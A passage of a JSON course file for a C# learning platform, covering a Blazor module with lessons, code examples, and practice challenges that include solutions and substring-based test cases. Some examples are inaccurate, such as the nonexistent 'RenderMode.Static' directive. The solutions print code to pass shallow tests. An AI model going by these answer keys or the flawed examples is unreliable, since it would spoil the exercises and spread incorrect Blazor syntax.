                  "mistake": "Short expiration everywhere",
                  "consequence": "Cache hits drop, database load stays high. Defeats purpose of caching.",
                  "correction": "Use appropriate TTLs. Products: minutes-hours. User sessions: shorter. Static content: longer."
                },
                {
                  "mistake": "Not using tags",
                  "consequence": "Must invalidate keys one by one. Hard to invalidate related data together.",
                  "correction": "Use tags for related data groups. RemoveByTagAsync() invalidates all at once."
                },
                {
                  "mistake": "Caching user-specific data globally",
                  "consequence": "User A sees User B's data! Security and privacy violation.",
                  "correction": "Include user ID in cache key: 'user:{userId}:profile' not just 'profile'."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-13",
      "title": "Building Interactive UIs with Blazor",
      "description": "Create modern web user interfaces using Blazor, writing interactive components with C# instead of JavaScript.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-13-01",
          "title": "What is Blazor? (C# in the Browser!)",
          "moduleId": "module-13",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine building a website:\n\nOLD WAY:\n• HTML for structure\n• CSS for styling\n• JavaScript for interactivity\n• C# on server (backend only)\n\nBLAZOR WAY:\n• HTML for structure\n• CSS for styling\n• C# for interactivity! (No JavaScript required!)\n• C# everywhere - frontend AND backend!\n\nBlazor = Write interactive web UIs using C# instead of JavaScript!\n\nThink of it like:\n• React/Vue/Angular = JavaScript frameworks\n• Blazor = C# framework (same power, different language!)\n\nBlazor lets you:\n✅ Use C# skills for web development\n✅ Share code between client and server\n✅ Build SPAs (Single Page Applications)\n✅ Rich interactivity without JavaScript\n✅ Component-based architecture\n\nTwo main hosting models:\n1. Blazor Server - C# runs on server, UI updates over SignalR\n2. Blazor WebAssembly - C# runs IN BROWSER via WebAssembly\n3. Blazor Auto (.NET 8) - Best of both!\n\nThink: Blazor = 'Build modern web apps with C#, not JavaScript!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// BLAZOR COMPONENT (.razor file)\n// Counter.razor\n\n<h3>Counter Example</h3>\n\n<p>Current count: @currentCount</p>\n\n<button class=\"btn btn-primary\" @onclick=\"IncrementCount\">Click me</button>\n\n@code {\n    private int currentCount = 0;\n\n    private void IncrementCount()\n    {\n        currentCount++;  // C# code!\n    }\n}\n\n// WHAT MAKES THIS SPECIAL?\n// 1. HTML markup at top\n// 2. @code block with C# logic\n// 3. @onclick binds to C# method (not JavaScript!)\n// 4. @currentCount displays C# variable\n\n// COMPARISON TO JAVASCRIPT FRAMEWORKS\n\n// React (JavaScript):\n/*\nimport { useState } from 'react';\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Click me</button>\n    </div>\n  );\n}\n*/\n\n// Blazor (C#):\n/*\n<p>Count: @count</p>\n<button @onclick=\"() => count++\">Click me</button>\n\n@code {\n    private int count = 0;\n}\n*/\n\n// BENEFITS OF BLAZOR\n// ✅ One language (C#) for everything\n// ✅ Full .NET ecosystem (NuGet, LINQ, async/await)\n// ✅ Type safety (compile-time errors!)\n// ✅ Great tooling (Visual Studio, Rider)\n// ✅ Code sharing (models, logic, validation)\n// ✅ No JavaScript transpiling/bundling complexity",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`.razor file`**: Blazor components use .razor extension. Mix HTML markup with C# code. Top part = markup, @code block = C# logic.\n\n**`@variable`**: @ symbol in markup accesses C# variables/expressions. @currentCount displays the value. @DateTime.Now.Year shows current year.\n\n**`@onclick=\"MethodName\"`**: Event binding with @. @onclick for clicks, @onchange for input changes. Binds to C# methods, not JavaScript!\n\n**`@code { }`**: Contains C# logic for component. Define fields, properties, methods here. Private by default. This is your component's brain!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**Forgetting the @ symbol**: In markup, `currentCount` without @ is literal text! Always use `@currentCount` to access C# variables. This is the #1 beginner mistake.\n\n**Component naming**: Component files MUST start with uppercase! `Counter.razor` works, `counter.razor` may cause issues. Follow C# PascalCase convention.\n\n**JavaScript habits**: Don't look for .js files or write onclick=\"function()\". Blazor uses @onclick=\"CSharpMethod\" - all interactivity is C#!\n\n**Render mode required**: In .NET 8+, components need a render mode for interactivity. Without @rendermode, @onclick won't work! Static SSR has no interactivity.\n\n**Hot Reload limitations**: Some changes require app restart. Adding new components or changing namespaces won't Hot Reload - restart the app."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create your first Blazor component!\n\n1. Create a 'Greeting' component structure:\n   - Title: \"Welcome to Blazor!\"\n   - Display current year using @DateTime.Now.Year\n   - Input field for user's name\n   - Button \"Greet Me\"\n   - When clicked, display \"Hello, [name]! Welcome to Blazor!\"\n\n2. Component should have:\n   - HTML markup section\n   - @code block with:\n     - string name field\n     - string greeting field\n     - GreetUser() method that sets greeting\n\n3. Print the complete component structure\n\nThis demonstrates Blazor's syntax and interactivity!",
              "starterCode": "// Greeting.razor\n\n<h3>Welcome to Blazor!</h3>\n\n<p>Year: @DateTime.Now.Year</p>\n\n<div>\n    <label>Your Name:</label>\n    <!-- Input field here -->\n</div>\n\n<button @onclick=\"GreetUser\">Greet Me</button>\n\n<p>@greeting</p>\n\n@code {\n    private string name = \"\";\n    private string greeting = \"\";\n    \n    private void GreetUser()\n    {\n        // Set greeting message\n    }\n}",
              "solution": "// Greeting.razor\nusing System;\n\nConsole.WriteLine(@\"\n=== BLAZOR COMPONENT EXAMPLE ===\");\nConsole.WriteLine(@\"\n<h3>Welcome to Blazor!</h3>\n\n<p>Year: @DateTime.Now.Year</p>\n\n<div>\n    <label>Your Name:</label>\n    <input @bind=\"\"name\"\" placeholder=\"\"Enter your name\"\" />\n</div>\n\n<button class=\"\"btn btn-primary\"\" @onclick=\"\"GreetUser\"\">Greet Me</button>\n\n@if (!string.IsNullOrEmpty(greeting))\n{\n    <div class=\"\"alert alert-success\"\">\n        <p>@greeting</p>\n    </div>\n}\n\n@code {\n    private string name = \"\"\"\";\n    private string greeting = \"\"\"\";\n    \n    private void GreetUser()\n    {\n        if (!string.IsNullOrEmpty(name))\n        {\n            greeting = $\"\"Hello, {name}! Welcome to Blazor!\"\";\n        }\n        else\n        {\n            greeting = \"\"Please enter your name first!\"\";\n        }\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== HOW IT WORKS ===\");\nConsole.WriteLine(\"1. @bind=\\\"name\\\" creates two-way data binding\");\nConsole.WriteLine(\"2. User types → name variable updates automatically\");\nConsole.WriteLine(\"3. @onclick=\\\"GreetUser\\\" calls C# method on click\");\nConsole.WriteLine(\"4. GreetUser() updates greeting variable\");\nConsole.WriteLine(\"5. @greeting displays the message (re-renders automatically!)\");\nConsole.WriteLine(\"\\n✓ All logic in C#, no JavaScript needed!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"BLAZOR COMPONENT\"",
                  "expectedOutput": "BLAZOR COMPONENT",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Welcome to Blazor\"",
                  "expectedOutput": "Welcome to Blazor",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"@code\"",
                  "expectedOutput": "@code",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"GreetUser\"",
                  "expectedOutput": "GreetUser",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "@bind for two-way binding on input. @onclick for button click. Use string interpolation in C# method. @if for conditional rendering. All C# code goes in @code block!"
                },
                {
                  "level": 2,
                  "text": "Forgetting @ symbol: In markup, use @ to access C# variables! Just 'currentCount' won't work, need '@currentCount'. @ tells Blazor 'this is C#!'"
                },
                {
                  "level": 3,
                  "text": "JavaScript thinking: Don't add .js files or write JavaScript! Blazor uses C# for everything. @onclick calls C# methods, not JS functions."
                },
                {
                  "level": 4,
                  "text": "Quotes in @onclick: Use @onclick=\"MethodName\" (no parentheses unless passing parameters). For lambda: @onclick=\"() => count++\" with quotes around entire expression."
                },
                {
                  "level": 5,
                  "text": "Component naming: Component files must start with uppercase letter! Counter.razor (correct), counter.razor (wrong). This is C# convention."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting @ symbol",
                  "consequence": "In markup, use @ to access C# variables! Just 'currentCount' won't work, need '@currentCount'. @ tells Blazor 'this is C#!'",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "JavaScript thinking",
                  "consequence": "Don't add .js files or write JavaScript! Blazor uses C# for everything. @onclick calls C# methods, not JS functions.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Quotes in @onclick",
                  "consequence": "Use @onclick=\"MethodName\" (no parentheses unless passing parameters). For lambda: @onclick=\"() => count++\" with quotes around entire expression.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Component naming",
                  "consequence": "Component files must start with uppercase letter! Counter.razor (correct), counter.razor (wrong). This is C# convention.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-02",
          "title": "Blazor Rendering Modes (.NET 8)",
          "moduleId": "module-13",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine watching a movie:\n\nSTREAMING (Blazor Server):\n• Movie plays on Netflix server\n• Only video frames sent to your screen\n• Fast startup, low download\n• Need constant internet connection\n\nDOWNLOADED (Blazor WebAssembly):\n• Download entire movie to device\n• Plays offline on your device\n• Large download, but works offline\n• Device does all the work\n\nSMART MODE (Blazor Auto - .NET 8+):\n• Starts streaming immediately (fast!)\n• Downloads in background\n• Switches to local playback when ready\n• Best of both worlds!\n\n.NET 8/9 UNIFIED RENDERING:\n• Static SSR (Server-Side Rendering) - No interactivity, SEO-friendly\n• Interactive Server - C# on server via SignalR\n• Interactive WebAssembly - C# in browser via WASM\n• Interactive Auto - Best of Server + WASM!\n\n.NET 9 improvements:\n• 25% faster WebAssembly startup\n• Better reconnection experience\n• [ExcludeFromInteractiveRouting] for static pages\n• WebSocket compression for Server mode\n\nChoose per component or page!\n\nThink: Rendering mode = 'WHERE does C# code run - server or browser?'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// .NET 8 RENDERING MODES\n\n// 1. STATIC SERVER-SIDE RENDERING (SSR)\n// Default - no interactivity, fast SEO\n@page \"/products\"\n@rendermode RenderMode.Static\n\n<h3>Product List</h3>\n@foreach (var product in products)\n{\n    <p>@product.Name</p>\n}\n\n// 2. INTERACTIVE SERVER\n// C# runs on server, UI updates via SignalR\n@page \"/counter\"\n@rendermode InteractiveServer\n\n<button @onclick=\"IncrementCount\">Count: @count</button>\n\n@code {\n    private int count = 0;\n    private void IncrementCount() => count++;\n}\n\n// 3. INTERACTIVE WEBASSEMBLY\n// C# runs in browser via WebAssembly\n@page \"/calculator\"\n@rendermode InteractiveWebAssembly\n\n<button @onclick=\"Calculate\">Calculate</button>\n\n// 4. INTERACTIVE AUTO (.NET 8 - BEST!)\n// Starts with Server, switches to WASM when ready\n@page \"/dashboard\"\n@rendermode InteractiveAuto\n\n<RealTimeChart />  // Server initially, then WASM\n\n// COMPARISON TABLE\n/*\n                    Server      WebAssembly     Auto (.NET 8)\nC# runs on:         Server      Browser         Both\nInitial load:       Fast        Slow            Fast\nOffline:            No          Yes             Yes*\nScalability:        Lower       Higher          Best\nLatency:            Network     None            Hybrid\nBest for:           Forms       SPAs            Everything\n*/\n\n// CONFIGURING IN PROGRAM.CS (.NET 8)\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add Blazor components with all render modes\nbuilder.Services.AddRazorComponents()\n    .AddInteractiveServerComponents()\n    .AddInteractiveWebAssemblyComponents();\n\nvar app = builder.Build();\n\n// Map Blazor with all render modes enabled\napp.MapRazorComponents<App>()\n    .AddInteractiveServerRenderMode()\n    .AddInteractiveWebAssemblyRenderMode()\n    .AddInteractiveAutoRenderMode();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`@rendermode InteractiveServer`**: .NET 8 syntax for render mode. C# runs on server. UI updates over SignalR connection. Low initial payload, requires connection.\n\n**`@rendermode InteractiveWebAssembly`**: C# compiles to WebAssembly, runs in browser. Large download, but fully client-side. Works offline after load!\n\n**`@rendermode InteractiveAuto`**: NEW in .NET 8! Starts with Server (fast), downloads WASM in background, seamlessly switches. Best user experience!\n\n**`Static SSR`**: No interactivity, pure HTML. Like traditional web pages. Fast, SEO-friendly. Use for content pages, blogs, documentation."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**Static SSR = No @onclick**: If you forget to set a render mode, components use Static SSR by default. Buttons won't respond to clicks! Add @rendermode for interactivity.\n\n**WebAssembly download size**: First load downloads 5-10MB (.NET runtime + app). Users on slow connections may wait 10+ seconds. Use InteractiveAuto to start fast!\n\n**Server connection required**: InteractiveServer needs constant SignalR connection. Lost internet = frozen UI. Consider InteractiveAuto for better offline resilience.\n\n**Prerendering double execution**: By default, components prerender on server, then render again on client. OnInitialized runs TWICE! Use `prerender: false` or persist state.\n\n**Mixing modes complexity**: Different render modes can't share state directly. Server component can't access WebAssembly component's memory. Use services or cascading parameters.\n\n**.NET 9 update**: Use [ExcludeFromInteractiveRouting] attribute for pages that MUST use Static SSR (like those needing HTTP cookies) in globally interactive apps."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Understand Blazor rendering modes!\n\n1. Create examples showing when to use each mode:\n\n   STATIC SSR:\n   - Product catalog page\n   - Blog posts\n   - Why: Fast, SEO, no interactivity needed\n\n   INTERACTIVE SERVER:\n   - Admin dashboard\n   - Form with validation\n   - Why: Complex logic on server, small payload\n\n   INTERACTIVE WEBASSEMBLY:\n   - Image editor\n   - Game\n   - Why: Works offline, no server calls\n\n   INTERACTIVE AUTO:\n   - E-commerce site\n   - Social media feed\n   - Why: Fast start, then offline capability\n\n2. Print comparison table\n3. Show .NET 8 configuration code\n4. Explain trade-offs",
              "starterCode": "using System;\n\nConsole.WriteLine(\"=== BLAZOR RENDERING MODES (.NET 8) ===\");\n\nConsole.WriteLine(\"\\n1. STATIC SSR (Server-Side Rendering)\");\nConsole.WriteLine(\"   Use case: Product catalog, blog posts\");\nConsole.WriteLine(\"   Code: @rendermode RenderMode.Static\");\nConsole.WriteLine(\"   Pros: Fast, SEO-friendly, low server load\");\nConsole.WriteLine(\"   Cons: No interactivity\");\n\n// Add other modes...\n\nConsole.WriteLine(\"\\n=== COMPARISON TABLE ===\");\nConsole.WriteLine(\"Feature          | Server  | WASM    | Auto\");\nConsole.WriteLine(\"-----------------|---------|---------|--------\");\n// Fill in comparison\n\nConsole.WriteLine(\"\\n=== .NET 8 CONFIGURATION ===\");\nConsole.WriteLine(\"builder.Services.AddRazorComponents()\");\n// Show configuration",
              "solution": "using System;\n\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  BLAZOR RENDERING MODES (.NET 8)\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\n\nConsole.WriteLine(\"1. STATIC SSR (Server-Side Rendering)\");\nConsole.WriteLine(\"   Code: @rendermode RenderMode.Static\");\nConsole.WriteLine(\"   ✓ Use for: Product catalogs, blogs, documentation\");\nConsole.WriteLine(\"   ✓ Pros: Fastest load, best SEO, minimal server resources\");\nConsole.WriteLine(\"   ✗ Cons: No interactivity (like traditional HTML)\");\nConsole.WriteLine(\"   Example: Public product listing page\\n\");\n\nConsole.WriteLine(\"2. INTERACTIVE SERVER\");\nConsole.WriteLine(\"   Code: @rendermode InteractiveServer\");\nConsole.WriteLine(\"   ✓ Use for: Admin dashboards, forms, real-time updates\");\nConsole.WriteLine(\"   ✓ Pros: Small payload, complex logic on server, secure\");\nConsole.WriteLine(\"   ✗ Cons: Requires connection, server load per user\");\nConsole.WriteLine(\"   Example: Admin panel with real-time data\\n\");\n\nConsole.WriteLine(\"3. INTERACTIVE WEBASSEMBLY\");\nConsole.WriteLine(\"   Code: @rendermode InteractiveWebAssembly\");\nConsole.WriteLine(\"   ✓ Use for: Image editors, games, offline apps\");\nConsole.WriteLine(\"   ✓ Pros: Works offline, no server calls, scales infinitely\");\nConsole.WriteLine(\"   ✗ Cons: Large download (5-10MB), slow initial load\");\nConsole.WriteLine(\"   Example: Photo editing tool\\n\");\n\nConsole.WriteLine(\"4. INTERACTIVE AUTO (.NET 8 - RECOMMENDED!)\");\nConsole.WriteLine(\"   Code: @rendermode InteractiveAuto\");\nConsole.WriteLine(\"   ✓ Use for: E-commerce, SPAs, social media\");\nConsole.WriteLine(\"   ✓ Pros: Fast start (Server), then offline (WASM), best UX\");\nConsole.WriteLine(\"   ✗ Cons: More complex setup\");\nConsole.WriteLine(\"   Example: Modern web application\\n\");\n\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  COMPARISON TABLE\");\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"Feature          | Static | Server  | WASM    | Auto\");\nConsole.WriteLine(\"-----------------|--------|---------|---------|--------\");\nConsole.WriteLine(\"Initial Load     | ⚡⚡⚡  | ⚡⚡    | 🐌      | ⚡⚡\");\nConsole.WriteLine(\"Interactivity    | ❌     | ✅      | ✅      | ✅\");\nConsole.WriteLine(\"Offline Support  | ❌     | ❌      | ✅      | ✅\");\nConsole.WriteLine(\"Server Load      | Low    | High    | None    | Medium\");\nConsole.WriteLine(\"SEO              | ⭐⭐⭐ | ⭐⭐    | ⭐      | ⭐⭐\");\nConsole.WriteLine(\"Download Size    | 0 KB   | ~100KB  | 5-10MB  | ~100KB\");\n\nConsole.WriteLine(\"\\n═══════════════════════════════════════════\");\nConsole.WriteLine(\"  .NET 8 CONFIGURATION\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\nConsole.WriteLine(\"// Program.cs\");\nConsole.WriteLine(\"var builder = WebApplication.CreateBuilder(args);\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"// Enable all render modes\");\nConsole.WriteLine(\"builder.Services.AddRazorComponents()\");\nConsole.WriteLine(\"    .AddInteractiveServerComponents()\");\nConsole.WriteLine(\"    .AddInteractiveWebAssemblyComponents();\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"var app = builder.Build();\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"// Map with all render modes\");\nConsole.WriteLine(\"app.MapRazorComponents<App>()\");\nConsole.WriteLine(\"    .AddInteractiveServerRenderMode()\");\nConsole.WriteLine(\"    .AddInteractiveWebAssemblyRenderMode()\");\nConsole.WriteLine(\"    .AddInteractiveAutoRenderMode();\");\n\nConsole.WriteLine(\"\\n🎯 RECOMMENDATION: Use InteractiveAuto for most apps!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"STATIC SSR\"",
                  "expectedOutput": "STATIC SSR",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"INTERACTIVE SERVER\"",
                  "expectedOutput": "INTERACTIVE SERVER",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"WEBASSEMBLY\"",
                  "expectedOutput": "WEBASSEMBLY",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"AUTO\"",
                  "expectedOutput": "AUTO",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"COMPARISON\"",
                  "expectedOutput": "COMPARISON",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \".NET 8\"",
                  "expectedOutput": ".NET 8",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Static = no interactivity. Server = C# on server. WASM = C# in browser. Auto = starts Server, becomes WASM. Choose based on: speed, interactivity, offline needs."
                },
                {
                  "level": 2,
                  "text": "Using wrong mode: Static SSR for interactive app = no @onclick works! Must use Interactive* modes for interactivity. Static is like traditional HTML."
                },
                {
                  "level": 3,
                  "text": "WASM download size: WebAssembly downloads .NET runtime + your app (5-10MB!). First load is slow. Use Auto mode to start fast, switch to WASM later."
                },
                {
                  "level": 4,
                  "text": "Server scalability: InteractiveServer creates SignalR connection per user. 10,000 users = 10,000 connections! WASM scales better (runs in browser)."
                },
                {
                  "level": 5,
                  "text": "Mixing modes: Can use different modes for different components! Product list (Static), shopping cart (Server), image editor (WASM). Mix and match!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using wrong mode",
                  "consequence": "Static SSR for interactive app = no @onclick works! Must use Interactive* modes for interactivity. Static is like traditional HTML.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "WASM download size",
                  "consequence": "WebAssembly downloads .NET runtime + your app (5-10MB!). First load is slow. Use Auto mode to start fast, switch to WASM later.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Server scalability",
                  "consequence": "InteractiveServer creates SignalR connection per user. 10,000 users = 10,000 connections! WASM scales better (runs in browser).",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Mixing modes",
                  "consequence": "Can use different modes for different components! Product list (Static), shopping cart (Server), image editor (WASM). Mix and match!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-03",
          "title": "Creating Razor Components (Building Blocks)",
          "moduleId": "module-13",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Components are like LEGO blocks:\n\n• Each block (component) is self-contained\n• Blocks snap together to build complex structures\n• Reuse the same block many times\n• Each block has its own logic and appearance\n\nButton.razor = reusable button component\nCard.razor = reusable card component  \nNavBar.razor = reusable navigation\n\nComponents have:\n• MARKUP (HTML) - What it looks like\n• LOGIC (@code) - How it behaves\n• PARAMETERS - Customization options\n• EVENTS - Communication with parents\n\nThink: Component = 'Self-contained, reusable UI piece with its own HTML, CSS, and C# logic!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// SIMPLE COMPONENT\n// Alert.razor\n<div class=\"alert alert-info\">\n    <p>@Message</p>\n</div>\n\n@code {\n    [Parameter]\n    public string Message { get; set; } = \"\";\n}\n\n// USING THE COMPONENT\n// Home.razor\n<Alert Message=\"Welcome to Blazor!\" />\n<Alert Message=\"This is reusable!\" />\n\n// COMPONENT WITH LOGIC\n// Counter.razor\n<div class=\"counter-box\">\n    <h4>@Title</h4>\n    <p>Count: @currentCount</p>\n    <button @onclick=\"Increment\">+</button>\n    <button @onclick=\"Decrement\">-</button>\n    <button @onclick=\"Reset\">Reset</button>\n</div>\n\n@code {\n    [Parameter]\n    public string Title { get; set; } = \"Counter\";\n    \n    [Parameter]\n    public int InitialValue { get; set; } = 0;\n    \n    private int currentCount;\n    \n    protected override void OnInitialized()\n    {\n        currentCount = InitialValue;\n    }\n    \n    private void Increment() => currentCount++;\n    private void Decrement() => currentCount--;\n    private void Reset() => currentCount = InitialValue;\n}\n\n// USING WITH PARAMETERS\n<Counter Title=\"Score\" InitialValue=\"100\" />\n<Counter Title=\"Lives\" InitialValue=\"3\" />\n\n// COMPONENT LIFECYCLE\n/*\n1. OnInitialized() - Component created\n2. OnParametersSet() - Parameters received\n3. Render - UI drawn\n4. OnAfterRender() - After render complete\n5. Dispose() - Component destroyed\n*/",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`[Parameter]`**: Makes property a component parameter. Can be set from parent: <MyComponent Title=\"Hello\" />. Must be public property with [Parameter] attribute.\n\n**`OnInitialized()`**: Lifecycle method called once when component created. Use for initialization, loading data. Override with 'protected override void OnInitialized()'.\n\n**`<ComponentName />`**: Use component in parent. Self-closing if no child content. Pass parameters as attributes: <Alert Message=\"text\" />.\n\n**`Component file structure`**: .razor file with: HTML markup at top, @code block at bottom. Component name MUST match filename! Alert.razor contains Alert component."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**Filename mismatch**: Component filename MUST match the component name exactly. `Alert.razor` = Alert component. Mismatches cause 'component not found' errors.\n\n**Private parameters fail**: [Parameter] on private property doesn't work! Must be `public string Title { get; set; }`. Private = not visible to parent.\n\n**Mutating parameters directly**: Don't modify [Parameter] properties inside the component! Parent owns them. Use local field: `private int _count; [Parameter] public int InitialCount { set => _count = value; }`\n\n**OnInitialized vs OnParametersSet**: OnInitialized runs once at creation. OnParametersSet runs when parent changes parameters. Use OnParametersSet for parameter-dependent logic.\n\n**Async lifecycle methods**: Use OnInitializedAsync for async data loading, not OnInitialized with .Result (blocks thread!). Return Task, use await.\n\n**Missing @using**: Component not found? Check if you need `@using YourNamespace` at top of file or in _Imports.razor."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a reusable ProductCard component!\n\n1. ProductCard.razor component:\n   - Parameters: string Name, decimal Price, string ImageUrl, bool InStock\n   - Display product in card layout\n   - Show \"In Stock\" or \"Out of Stock\" badge\n   - Button \"Add to Cart\" (only enabled if InStock)\n   - OnAddToCart event callback\n\n2. Create ProductList component that uses ProductCard:\n   - Display 3 ProductCard components\n   - Handle AddToCart event\n   - Show count of items in cart\n\n3. Print both component structures\n\nThis demonstrates component reusability!",
              "starterCode": "// ProductCard.razor\n<div class=\"card\">\n    <img src=\"@ImageUrl\" alt=\"@Name\" />\n    <h4>@Name</h4>\n    <p class=\"price\">$@Price</p>\n    \n    @if (InStock)\n    {\n        <span class=\"badge-success\">In Stock</span>\n        <button @onclick=\"HandleAddToCart\">Add to Cart</button>\n    }\n    else\n    {\n        <span class=\"badge-danger\">Out of Stock</span>\n    }\n</div>\n\n@code {\n    [Parameter]\n    public string Name { get; set; } = \"\";\n    \n    [Parameter]\n    public decimal Price { get; set; }\n    \n    [Parameter]\n    public string ImageUrl { get; set; } = \"\";\n    \n    [Parameter]\n    public bool InStock { get; set; }\n    \n    [Parameter]\n    public EventCallback OnAddToCart { get; set; }\n    \n    private async Task HandleAddToCart()\n    {\n        await OnAddToCart.InvokeAsync();\n    }\n}\n\n// ProductList.razor\n<h3>Our Products</h3>\n\n<div class=\"product-grid\">\n    <ProductCard \n        Name=\"Laptop\" \n        Price=\"999.99m\" \n        ImageUrl=\"laptop.jpg\"\n        InStock=\"true\"\n        OnAddToCart=\"() => AddToCart(\\\"Laptop\\\")\" />\n    \n    <!-- Add 2 more ProductCard components -->\n</div>\n\n<p>Cart Items: @cartCount</p>\n\n@code {\n    private int cartCount = 0;\n    \n    private void AddToCart(string productName)\n    {\n        cartCount++;\n        // In real app: add to cart service\n    }\n}",
              "solution": "using System;\n\nConsole.WriteLine(@\"\n=== PRODUCTCARD COMPONENT ===\");\nConsole.WriteLine(@\"\n// ProductCard.razor\n<div class=\"\"card\"\">\n    <img src=\"\"@ImageUrl\"\" alt=\"\"@Name\"\" style=\"\"width:100%\"\" />\n    <div class=\"\"card-body\"\">\n        <h4>@Name</h4>\n        <p class=\"\"price\"\" style=\"\"font-size:1.5em\"\">$@Price.ToString(\\\"\"F2\\\"\")</p>\n        \n        @if (InStock)\n        {\n            <span class=\"\"badge bg-success\"\">✓ In Stock</span>\n            <button class=\"\"btn btn-primary\"\" @onclick=\"\"HandleAddToCart\"\">Add to Cart</button>\n        }\n        else\n        {\n            <span class=\"\"badge bg-danger\"\">✗ Out of Stock</span>\n            <button class=\"\"btn btn-secondary\"\" disabled>Unavailable</button>\n        }\n    </div>\n</div>\n\n@code {\n    [Parameter]\n    public string Name { get; set; } = \"\"\"\";\n    \n    [Parameter]\n    public decimal Price { get; set; }\n    \n    [Parameter]\n    public string ImageUrl { get; set; } = \"\"\"\";\n    \n    [Parameter]\n    public bool InStock { get; set; }\n    \n    [Parameter]\n    public EventCallback<string> OnAddToCart { get; set; }\n    \n    private async Task HandleAddToCart()\n    {\n        await OnAddToCart.InvokeAsync(Name);\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== PRODUCTLIST COMPONENT ===\");\nConsole.WriteLine(@\"\n// ProductList.razor\n<div class=\"\"container\"\">\n    <h3>Our Products</h3>\n    \n    <div class=\"\"alert alert-info\"\">\n        <strong>Cart Items: @cartCount</strong>\n    </div>\n    \n    <div class=\"\"row\"\">\n        <div class=\"\"col-md-4\"\">\n            <ProductCard \n                Name=\"\"Laptop\"\" \n                Price=\"\"999.99m\"\" \n                ImageUrl=\"\"laptop.jpg\"\"\n                InStock=\"\"true\"\"\n                OnAddToCart=\"\"AddToCart\"\" />\n        </div>\n        \n        <div class=\"\"col-md-4\"\">\n            <ProductCard \n                Name=\"\"Mouse\"\" \n                Price=\"\"29.99m\"\" \n                